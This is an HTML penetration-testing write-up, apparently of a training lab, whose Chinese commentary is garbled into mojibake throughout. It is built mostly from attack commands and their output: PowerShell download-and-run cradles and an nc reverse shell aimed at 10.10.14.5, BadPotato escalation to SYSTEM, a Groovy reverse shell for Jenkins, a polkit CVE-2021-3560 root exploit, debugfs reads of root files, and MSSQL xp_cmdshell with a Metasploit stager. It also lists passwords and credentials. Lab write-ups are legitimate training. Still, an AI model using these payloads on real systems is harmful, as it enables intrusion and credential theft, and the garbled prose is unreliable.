<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://10.10.14.5:9999/Invoke-winPEAS.ps1'</span><span class="p">)</span><span class="w">
</span><span class="nx">Invoke-winPEAS</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="o">.</span><span class="nf">out</span><span class="w">
</span></code></pre></div></div>
<p>dante-ws03\blake å…·å¤‡ SeImpersonatePrivilege æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ Potato å®¶æ—è¿›è¡Œææƒã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    SeShutdownPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: DISABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED
</code></pre></div></div>

<p>BadPotato æ˜¯ SweetPotato çš„ C# ç‰ˆæœ¬ï¼ŒPowerSharpPack ä¸­å·²ç»é›†æˆäº† BadPotato çš„ powershell ç‰ˆæœ¬ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>c:<span class="se">\t</span>emp
<span class="nb">cd </span>c:<span class="se">\t</span>emp
<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'http://10.10.14.5:9999/runme.bat'</span>,<span class="s1">'c:\temp\runme.bat'</span><span class="o">)</span>

iex<span class="o">(</span>new-object net.webclient<span class="o">)</span>.downloadstring<span class="o">(</span><span class="s1">'http://10.10.14.5:9999/Invoke-BadPotato.ps1'</span><span class="o">)</span>

Invoke-BadPotato <span class="nt">-Command</span> <span class="s2">"c:</span><span class="se">\t</span><span class="s2">emp</span><span class="se">\r</span><span class="s2">unme.bat"</span>
</code></pre></div></div>
<p>ä½†æ‰§è¡Œä¹‹åæ— æ³•æˆåŠŸï¼Œç›´æ¥é€šè¿‡ <code class="language-plaintext highlighter-rouge">whoami /priv</code> æ˜¾ç¤º <code class="language-plaintext highlighter-rouge">Access is denied</code>ã€‚</p>

<p>æ‰§è¡Œ msf è½½è·ï¼Œè·å–åˆ°ä¸€ä¸ª meterpreter ä¹‹åå†è¿›å…¥ powershell å°±å¯ä»¥æˆåŠŸææƒäº†ã€‚</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\t</span>emp&gt; Invoke-BadPotato <span class="nt">-Command</span> <span class="s2">"whoami"</span>
Invoke-BadPotato <span class="nt">-Command</span> <span class="s2">"whoami"</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span>

    ____            ______        __        __      
   / __ <span class="o">)</span>____ _____/ / __ <span class="se">\_</span>___  / /_____ _/ /_____ 
  / __  / __ <span class="sb">`</span>/ __  / /_/ / __ <span class="se">\/</span> __/ __ <span class="sb">`</span>/ __/ __ <span class="se">\</span>
 / /_/ / /_/ / /_/ / ____/ /_/ / /_/ /_/ / /_/ /_/ /
/_____/<span class="se">\_</span>_,_/<span class="se">\_</span>_,_/_/    <span class="se">\_</span>___/<span class="se">\_</span>_/<span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>___/ 

Github:https://github.com/BeichenDream/BadPotato/       By:BeichenDream
            
<span class="o">[</span><span class="k">*</span><span class="o">]</span> PipeName : <span class="se">\\</span>.<span class="se">\p</span>ipe<span class="se">\6</span>6836c1007e24080b640ea5c4d421270<span class="se">\p</span>ipe<span class="se">\s</span>poolss
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ConnectPipeName : <span class="se">\\</span>DANTE-WS03/pipe/66836c1007e24080b640ea5c4d421270
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CreateNamedPipeW Success! IntPtr:2744
<span class="o">[</span><span class="k">*</span><span class="o">]</span> RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:2124303388560
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ConnectNamePipe Success!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CurrentUserName : blake
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CurrentConnectPipeUserName : SYSTEM
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ImpersonateNamedPipeClient Success!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> OpenThreadToken Success! IntPtr:1660
<span class="o">[</span><span class="k">*</span><span class="o">]</span> DuplicateTokenEx Success! IntPtr:1652
<span class="o">[</span><span class="k">*</span><span class="o">]</span> SetThreadToken Success!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CurrentThreadUserName : NT AUTHORITY<span class="se">\S</span>YSTEM
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CreateOutReadPipe Success! out_read:1648 out_write:1640
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CreateErrReadPipe Success! err_read:1664 err_write:1672
<span class="o">[</span><span class="k">*</span><span class="o">]</span> CreateProcessWithTokenW Success! ProcessPid:5076
nt authority<span class="se">\s</span>ystem


<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bye!

</code></pre></div></div>
<p>ä½†ä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œæ‰§è¡Œ runme.bat æˆ–è€… nc åå¼¹ shell æ—¶ä¼šå¡ä½ã€‚</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-BadPotato</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"c:\temp\nc.exe -e powershell.exe 10.10.14.5 9001"</span><span class="w">
</span><span class="n">Invoke-BadPotato</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"c:\temp\runme.bat"</span><span class="w">
</span></code></pre></div></div>
<p>ç›´æ¥ä½¿ç”¨ msf å†…ç½®çš„ getsystem è·å–åˆ° system æƒé™ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> getsystem
...got system via technique 5 <span class="o">(</span>Named Pipe Impersonation <span class="o">(</span>PrintSpooler variant<span class="o">))</span><span class="nb">.</span>
</code></pre></div></div>

<h1 id="linux-17216119">Linux: 172.16.1.19</h1>
<p>172.16.1.19	80      apache æœåŠ¡ï¼Œå¯æ˜¾ç¤ºç›®å½•ï¼Œä½†æ²¡æœ‰å†…å®¹
172.16.1.19	8080    Jekins æœåŠ¡
172.16.1.19	8443    å¯èƒ½æ˜¯æ‰«æé”™è¯¯ï¼Œæ— æ³•è®¿é—®
172.16.1.19	8888    å¯èƒ½æ˜¯æ‰«æé”™è¯¯ï¼Œæ— æ³•è®¿é—®</p>

<p>éƒ¨åˆ†ç«¯å£æ— æ³•è®¿é—®ï¼Œå¯èƒ½æ˜¯ä½¿ç”¨ fscan æ‰«æå‡ºç°é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨ nmap é‡æ–°æ‰«ä¸€éã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> nmap 172.16.1.102 <span class="nt">-sT</span> <span class="nt">-Pn</span> <span class="nt">-T5</span>
</code></pre></div></div>

<h2 id="jekins-åå°-getshell">Jekins åå° getshell</h2>
<p>goby æ‰«æ Jenkins ç‰ˆæœ¬ä¸º 2.240ï¼Œå­˜åœ¨ WEB-INF/web.xml è¯»å–æ¼æ´ï¼Œä½†å¤ç°åå‘ç°å¹¶æœªå­˜åœ¨ï¼Œåº”è¯¥æ˜¯è¯¯æŠ¥ã€‚</p>

<p>2.240 ç‰ˆæœ¬æ²¡æœ‰å…¬å¼€æ¼æ´ï¼Œå°è¯•çˆ†ç ´ç”¨æˆ·åå¯†ç ã€‚msf ä¸­æœ‰é›†æˆ jenkins ç™»é™†çˆ†ç ´è„šæœ¬ï¼š</p>
<ul>
  <li>auxiliary/scanner/http/jenkins_login</li>
</ul>

<p>åˆ©ç”¨è„šæœ¬çš„ USERPASS_FILE å¯ä»¥è®¾ç½®ç”¨æˆ·åå¯†ç æ–‡ä»¶ï¼Œç”¨æˆ·åå’Œå¯†ç ä¹‹é—´ç”¨ç©ºæ ¼åˆ‡åˆ†ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asmith Princess1
smoggat Summer2019
tmodle P45678!
ccraven Password1
kploty Teacher65
jbercov 4567Holiday1
whaguey acb123
dcamtan WorldOfWarcraft67
tspadly RopeBlackfieldForwardslash
ematlis JuneJuly1TY
fglacdon FinalFantasy7
tmentrso 65RedBalloons
dharding WestminsterOrange5
smillar MarksAndSparks91
bjohnston Bullingdon1
iahmed Sheffield23
plongbottom PowerfixSaturdayClub777
jcarrot Tanenbaum0001
lgesley SuperStrongCantForget123456789
julian manchesterunited
ben Welcometomyblog
balthazar TheJoker12345!
mrb3n S3kur1ty2020!
</code></pre></div></div>

<p>ä½†æ­¤å‰åœ¨ 172.16.2.5 (DANTE-DC02) ä¸­è·å–åˆ°äº†ä¸€ä¸ª jenkins.batï¼Œå…¶ä¸­å°±åŒ…å«äº†ä¸€ä¸ª jenkins çš„å‡­è¯ï¼Œè¯¥å‡­è¯å¯ä»¥æ­£å¸¸ç™»é™†åˆ°åå°ã€‚</p>
<ul>
  <li>Admin_129834765/SamsungOctober102030</li>
</ul>

<p>ç™»é™†æˆåŠŸåå¯ä»¥çœ‹åˆ°ä¸€ä¸ª Project FLAG_HEREï¼Œå…¶ä¸­åŒ…å«äº† flag</p>

<p>jenkins ä¸­çš„ script console å¯ä»¥è¿›ä¸€æ­¥é€šè¿‡æ‰§è¡Œ Groovy è·å–ç³»ç»Ÿ shellã€‚è®¿é—® urlï¼š/script</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">host</span><span class="o">=</span><span class="s">"10.10.14.5"</span><span class="o">;</span><span class="kt">int</span> <span class="n">port</span><span class="o">=</span><span class="mi">9898</span><span class="o">;</span><span class="nc">String</span> <span class="n">cmd</span><span class="o">=</span><span class="s">"bash"</span><span class="o">;</span><span class="nc">Process</span> <span class="n">p</span><span class="o">=</span><span class="k">new</span> <span class="nc">ProcessBuilder</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">redirectErrorStream</span><span class="o">(</span><span class="kc">true</span><span class="o">).</span><span class="na">start</span><span class="o">();</span><span class="nc">Socket</span> <span class="n">s</span><span class="o">=</span><span class="k">new</span> <span class="nc">Socket</span><span class="o">(</span><span class="n">host</span><span class="o">,</span><span class="n">port</span><span class="o">);</span><span class="nc">InputStream</span> <span class="n">pi</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(),</span><span class="n">pe</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getErrorStream</span><span class="o">(),</span> <span class="n">si</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span><span class="nc">OutputStream</span> <span class="n">po</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">(),</span><span class="n">so</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span><span class="k">while</span><span class="o">(!</span><span class="n">s</span><span class="o">.</span><span class="na">isClosed</span><span class="o">()){</span><span class="k">while</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="k">while</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="k">while</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">po</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="n">so</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="n">po</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">50</span><span class="o">);</span><span class="k">try</span> <span class="o">{</span><span class="n">p</span><span class="o">.</span><span class="na">exitValue</span><span class="o">();</span><span class="k">break</span><span class="o">;}</span><span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){}};</span><span class="n">p</span><span class="o">.</span><span class="na">destroy</span><span class="o">();</span><span class="n">s</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
</code></pre></div></div>
<p>pwncat-csï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listen <span class="nt">-m</span> linux 9898
</code></pre></div></div>
<h2 id="ææƒè‡³-ian-pspy">ææƒè‡³ ian: pspy</h2>
<p>pspy å¯ä»¥æŸ¥çœ‹åˆ°ä¸€äº›éšè—çš„è¿›ç¨‹ï¼Œå…¶ä¸­å¯èƒ½å°±åŒ…å«äº†æ•æ„Ÿçš„å‡­è¯ä¿¡æ¯ï¼Œè¿™éƒ¨åˆ†åŠŸèƒ½æ˜¯ linPEAS ä¸å…·å¤‡çš„ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2024/01/01 16:35:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>142235 | /usr/sbin/CRON <span class="nt">-f</span> 
2024/01/01 16:35:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>142237 | /bin/bash mysql <span class="nt">-u</span> ian <span class="nt">-p</span> VPN123ZXC 
2024/01/01 16:35:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>142236 | /bin/sh <span class="nt">-c</span> /bin/bash mysql <span class="nt">-u</span> ian <span class="nt">-p</span> VPN123ZXC 
</code></pre></div></div>
<p>pspy æ‰¾åˆ°äº†ä¸€ä¸ªç”± ian ç”¨æˆ·è¿è¡Œçš„ mysql è¿æ¥ï¼Œå¯†ç ä¸º VPN123ZXC</p>

<h2 id="ææƒè‡³-root-polkitcve-2021-3560-1">ææƒè‡³ root: polkit:CVE-2021-3560</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â–€â–ˆâ–€â€ƒâ–ˆâ–€â–ˆâ€ƒâ–„â–€â–ˆâ€ƒâ–ˆâ€ƒâ–€â–ˆâ–€â€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–ˆ                                                                                                               
â–‘â–ˆâ–‘â€ƒâ–ˆâ–€â–„â€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ€ƒâ–‘â–ˆâ–‘â€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–€â–„ v0.0.14                                                                                                                   
https://github.com/liamg/traitor                                                                                                                    

<span class="o">[</span>+] Assessing machine state...                                                                                                                      
<span class="o">[</span>+] Checking <span class="k">for </span>opportunities...
<span class="o">[</span>+][polkit:CVE-2021-3560] Polkit version is vulnerable!
<span class="o">[</span>+][polkit:CVE-2021-3560] System is vulnerable! Run again with <span class="s1">'--exploit polkit:CVE-2021-3560'</span> to exploit it.
<span class="o">(</span>remote<span class="o">)</span> jenkins@DANTE-NIX07:/tmp/.j<span class="nv">$ </span>./.t <span class="nt">--exploit</span> polkit:CVE-2021-3560


â–€â–ˆâ–€â€ƒâ–ˆâ–€â–ˆâ€ƒâ–„â–€â–ˆâ€ƒâ–ˆâ€ƒâ–€â–ˆâ–€â€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–ˆ                                                                                                               
â–‘â–ˆâ–‘â€ƒâ–ˆâ–€â–„â€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ€ƒâ–‘â–ˆâ–‘â€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–€â–„ v0.0.14                                                                                                                   
https://github.com/liamg/traitor                                                                                                                    

<span class="o">[</span>+] Assessing machine state...                                                                                                                      
<span class="o">[</span>+] Checking <span class="k">for </span>opportunities...
<span class="o">[</span>+][polkit:CVE-2021-3560] Polkit version is vulnerable!
<span class="o">[</span>+][polkit:CVE-2021-3560] Opportunity found, trying to exploit it...
<span class="o">[</span>+][polkit:CVE-2021-3560] Sampling timing of user creation command...
<span class="o">[</span>+][polkit:CVE-2021-3560] Average <span class="nb">time </span><span class="k">for </span>user creation to fail authentication is 5.879881ms
<span class="o">[</span>+][polkit:CVE-2021-3560] Attempting to create user <span class="s1">'traitor795'</span> by forcing <span class="nv">UID</span><span class="o">=</span>0...
<span class="o">[</span>+][polkit:CVE-2021-3560] User <span class="s1">'traitor795'</span> was created with UID <span class="o">(</span>1002<span class="o">)!</span>
<span class="o">[</span>+][polkit:CVE-2021-3560] Sampling timing of password <span class="nb">set </span>command...
<span class="o">[</span>+][polkit:CVE-2021-3560] Average <span class="nb">time </span><span class="k">for </span>password <span class="nb">set </span>to fail authentication is 5.447048ms
<span class="o">[</span>+][polkit:CVE-2021-3560] Attempting to <span class="nb">set </span>user password...
<span class="o">[</span>+][polkit:CVE-2021-3560] Finished attempting to <span class="nb">set </span>password.
<span class="o">[</span>+][polkit:CVE-2021-3560] Setting up tty...
<span class="o">[</span>+][polkit:CVE-2021-3560] Attempting authentication as new user...
<span class="o">[</span>+][polkit:CVE-2021-3560] Authenticated as traitor795 <span class="o">(</span>1002<span class="o">)!</span>
<span class="o">[</span>+][polkit:CVE-2021-3560] Attempting escalation to root...
<span class="o">[</span>+][polkit:CVE-2021-3560] Authenticated as root!
<span class="o">[</span>+][polkit:CVE-2021-3560] Writing payload...

root@DANTE-NIX07:~# <span class="nb">ls</span>
</code></pre></div></div>
<h2 id="ææƒ-disk-ç»„ç”¨æˆ·åˆ©ç”¨">ææƒ: disk ç»„ç”¨æˆ·åˆ©ç”¨</h2>
<p>ian ç”¨æˆ·å±äº disk ç»„ï¼Œâ€diskâ€æ˜¯ä¸€ä¸ªç‰¹æ®Šç”¨é€”çš„ç³»ç»Ÿç»„ï¼Œç”¨äºæˆäºˆç”¨æˆ·å¯¹ç£ç›˜è®¿é—®çš„æƒé™ã€‚è¿™æ„å‘³ç€å±äºâ€diskâ€ç»„çš„ç”¨æˆ·å¯èƒ½å…·æœ‰ç‰¹å®šçš„ç£ç›˜è®¿é—®æƒé™ï¼Œä¾‹å¦‚å¯¹ç¡¬ç›˜é©±åŠ¨å™¨è¿›è¡Œè¯»å†™æ“ä½œã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>ian<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>ian<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>ian<span class="o">)</span>,6<span class="o">(</span>disk<span class="o">)</span>
</code></pre></div></div>
<p>åˆ‡æ¢åˆ° ian åæŸ¥çœ‹ /proc/self/mounts æ¥è·å–ç£ç›˜ä¿¡æ¯ï¼š<code class="language-plaintext highlighter-rouge">cat /proc/self/mounts|grep 'sda'</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /proc/self/mounts|grep <span class="s1">'sda'</span>
/dev/sda5 / ext4 rw,relatime,errors<span class="o">=</span>remount-ro 0 0
/dev/sda1 /boot/efi vfat rw,relatime,fmask<span class="o">=</span>0077,dmask<span class="o">=</span>0077,codepage<span class="o">=</span>437,iocharset<span class="o">=</span>iso8859-1,shortname<span class="o">=</span>mixed,errors<span class="o">=</span>remount-ro 0 0
</code></pre></div></div>
<p>å¯ä»¥çœ‹åˆ°æŒ‚è½½çš„ /dev/sda5 å°±æ˜¯æ ¹ç›®å½•ï¼Œå¹¶ä¸” ian ç”¨æˆ·å…·å¤‡ rw æƒé™ï¼Œè¯´æ˜å¯ä»¥é€šè¿‡ debugfs ç›´æ¥è¯»å–ä»»æ„çš„æ–‡ä»¶ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ian@DANTE-NIX07:/tmp<span class="nv">$ </span>debugfs /dev/sda5
debugfs 1.45.5 <span class="o">(</span>07-Jan-2020<span class="o">)</span>
debugfs:  <span class="nb">cat</span> /root/flag.txt
DANTE<span class="o">{</span>g0tta_&lt;3_ins3cur3_GROupz!<span class="o">}</span>
debugfs:  
</code></pre></div></div>
<h1 id="windows-1721615">Windows: 172.16.1.5</h1>
<p>å¼€æ”¾ç«¯å£ï¼š</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5985,135,445,111,2049,139,1433,47001,21
</code></pre></div></div>
<ol>
  <li>1433 MSSQL</li>
  <li>21 ftp
    <h2 id="ftp-å…è®¸åŒ¿åç™»é™†">FTP å…è®¸åŒ¿åç™»é™†</h2>
    <p>ä½¿ç”¨ cme å¯ä»¥æ‰¹é‡æ‰«æå†…ç½‘ä¸­çš„ ftp æ˜¯å¦å…è®¸ anonymous ç™»é™†ã€‚</p>
    <div class="language-bash highlighter-rouge">
<div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> crackmapexec ftp 172.16.1.0/24 <span class="nt">-u</span> anonymous <span class="nt">-p</span> <span class="s1">''</span>
</code></pre></div>    </div>
    <p>ç»“æœå¦‚ä¸‹ï¼š</p>
    <div class="language-bash highlighter-rouge">
<div class="highlight"><pre class="highlight"><code>FTP         172.16.1.5      21     172.16.1.5       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Banner: Dante Staff Drop Box
FTP         172.16.1.100    21     172.16.1.100     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Banner: <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
FTP         172.16.1.101    21     172.16.1.101     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Banner:-FileZilla Server 0.9.60 beta
220 DANTE-FTP
FTP         172.16.1.12     21     172.16.1.12      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Banner: ProFTPD Server <span class="o">(</span>ProFTPD<span class="o">)</span> <span class="o">[</span>::ffff:172.16.1.12]
FTP         172.16.1.5      21     172.16.1.5       <span class="o">[</span>+] anonymous:
FTP         172.16.1.100    21     172.16.1.100     <span class="o">[</span>+] anonymous:
FTP         172.16.1.101    21     172.16.1.101     <span class="o">[</span>-] anonymous: <span class="o">(</span>Response:530 Login or password incorrect!<span class="o">)</span>
FTP         172.16.1.12     21     172.16.1.12      <span class="o">[</span>-] anonymous: <span class="o">(</span>Response:530 Login incorrect.<span class="o">)</span>
</code></pre></div>    </div>
    <p>å¯ä»¥å‘ç° 172.16.1.5 ä¹ŸåŒæ ·å…è®¸ ftp åŒ¿åç™»é™†ã€‚</p>
  </li>
</ol>

<p>ç™»é™†åå¯ä»¥å¾—åˆ°ä¸€ä¸ª flag.txt</p>

<h2 id="nfs-æœåŠ¡æ¢æµ‹">NFS æœåŠ¡æ¢æµ‹</h2>
<p>172.16.1.5 çš„ 2049 ç«¯å£è¿è¡Œäº† nfs æœåŠ¡ï¼Œnfs æœåŠ¡ä¸ SMB æœ‰ç€ç›¸åŒçš„ç”¨é€”ï¼Œä½†æ²¡æœ‰èº«ä»½éªŒè¯å’Œæˆæƒæœºåˆ¶ã€‚</p>

<p>hacktricks ä¸­è¯¦ç»†è®°å½•äº†å¯¹ nfs æœåŠ¡çš„æ¸—é€æ€è·¯ï¼š<a href="https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting">2049 - Pentesting NFS Service - HackTricks</a></p>

<p>ä½† nfs æœåŠ¡ä¸Šæ²¡æœ‰æŒ‚è½½ä»»ä½•ä¸œè¥¿ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> showmount <span class="nt">-e</span> 172.168.1.5
</code></pre></div></div>

<h2 id="mssql-xp_cmdshell">MSSQL: xp_cmdshell</h2>
<p>æ­¤å‰åœ¨ 172.16.2.6 ä¸­è·å–åˆ°ä¸€ä¸ª SQL å‡­è¯ï¼š</p>
<ul>
  <li>Sophie/TerrorInflictPurpleDirt996655</li>
</ul>

<p>msf ä¸­é›†æˆäº† MSSQL ç™»é™†çš„è„šæœ¬ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/mssql/mssql_login
<span class="nb">set </span>USERNAME Sophie
<span class="nb">set </span>PASSWORD TerrorInflictPurpleDirt996655
<span class="nb">set </span>RHOST 172.16.1.5
run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433       - 172.16.1.5:1433 - MSSQL - Starting authentication scanner.
<span class="o">[!]</span> 172.16.1.5:1433       - No active DB <span class="nt">--</span> Credential data will not be saved!
<span class="o">[</span>+] 172.16.1.5:1433       - 172.16.1.5:1433 - Login Successful: WORKSTATION<span class="se">\S</span>ophie:TerrorInflictPurpleDirt996655
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433       - Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Auxiliary module execution completed
</code></pre></div></div>

<p>è¿æ¥ MSSQL å¯ä»¥ä½¿ç”¨ impacket ä¸­çš„ mssqlclient.py</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> mssqlclient.py Sophie:TerrorInflictPurpleDirt996655@172.16.1.5
</code></pre></div></div>
<p>ä½†ä¼šå‡ºç°æŠ¥é”™ï¼Œåº”è¯¥æ˜¯æœ¬åœ°ç¯å¢ƒçš„é—®é¢˜ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>-] <span class="o">[(</span><span class="s1">'SSL routines'</span>, <span class="s1">''</span>, <span class="s1">'no protocols available'</span><span class="o">)]</span>
</code></pre></div></div>
<p>åˆ‡æ¢åˆ° python 3.9 + Impacket v0.11.0 å¯ä»¥æ­£å¸¸è¿æ¥å¹¶æ‰§è¡Œ xp_cmdshellã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DANTE-SQL01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DANTE-SQL01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>150 7208<span class="o">)</span> 
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
SQL <span class="o">(</span>sophie  dbo@master<span class="o">)&gt;</span> EXEC xp_cmdshell <span class="s2">"net user"</span><span class="p">;</span>

</code></pre></div></div>

<h2 id="mssql-xp_cmdshell-msf">MSSQL: xp_cmdshell (MSF)</h2>
<p>msf ä¹Ÿé›†æˆäº†å¯¹ MSSQL xp_cmdshell çš„åˆ©ç”¨ï¼Œè¯¥ exp ä¼šå°è¯•è¿œç¨‹ä¸‹è½½ payload å†è¿è¡Œã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/mssql/mssql_payload
<span class="nb">set </span>LHOST 10.10.14.5
<span class="nb">set </span>RHOST 172.16.1.5
<span class="nb">set </span>username Sophie
<span class="nb">set </span>PassWORD TerrorInflictPurpleDirt996655
run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.5:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -   1.47% <span class="k">done</span> <span class="o">(</span>1499/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -   2.93% <span class="k">done</span> <span class="o">(</span>2998/102246 bytes<span class="o">)</span>
